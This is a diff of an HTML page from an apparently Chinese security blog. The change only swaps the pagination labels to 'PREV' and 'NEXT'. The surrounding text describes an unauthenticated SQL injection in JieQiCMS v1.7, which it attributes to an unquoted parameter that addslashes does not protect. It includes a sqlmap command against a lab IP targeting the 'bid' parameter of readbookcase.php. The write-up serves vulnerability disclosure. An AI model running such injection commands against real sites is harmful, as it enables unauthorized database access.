@@ -4,7 +4,7 @@
 <p>虽然程序在入口处对所有参数都进行了addslashes，但在构造sql语句时没有单引号保护导致sql注入。</p>
 <h4 id="三、漏洞证明"><a href="#三、漏洞证明" class="headerlink" title="三、漏洞证明"></a>三、漏洞证明</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python sqlmap.py -u <span class="string">"http://192.168.77.132/modules/article/readbookcase.php?aid=1&amp;bid=1"</span> -p bid --dbms mysql</div></pre></td></tr></table></figure>
 <h4 id="四、其它"><a href="#四、其它" class="headerlink" title="四、其它"></a>四、其它</h4><p>在审计的时候还发现了其它几个地方可能有update注入，但是没有继续验证了。直接在源码里找update类型的sql查询应该还能找几个注入点出来。</p>
-</div></article></div></main><footer><div class="paginator"><a href="/2017/04/21/phpcms_file_down/" class="prev">上一篇</a><a href="/2017/01/16/duomicms_sqli/" class="next">下一篇</a></div><div data-thread-key="2017/02/18/jieqicms_sqli/" data-title="JieQiCMS(V1.7)无需登录SQL注入" data-url="http://goodwaf.com/2017/02/18/jieqicms_sqli/" data-author-key="1" class="ds-thread"></div><script>var duoshuoQuery = {short_name:"seansun"};
+</div></article></div></main><footer><div class="paginator"><a href="/2017/04/21/phpcms_file_down/" class="prev">PREV</a><a href="/2017/01/16/duomicms_sqli/" class="next">NEXT</a></div><div data-thread-key="2017/02/18/jieqicms_sqli/" data-title="JieQiCMS(V1.7)无需登录SQL注入" data-url="http://goodwaf.com/2017/02/18/jieqicms_sqli/" data-author-key="1" class="ds-thread"></div><script>var duoshuoQuery = {short_name:"seansun"};
 (function() {
     var ds = document.createElement('script');
     ds.type = 'text/javascript';ds.async = true;
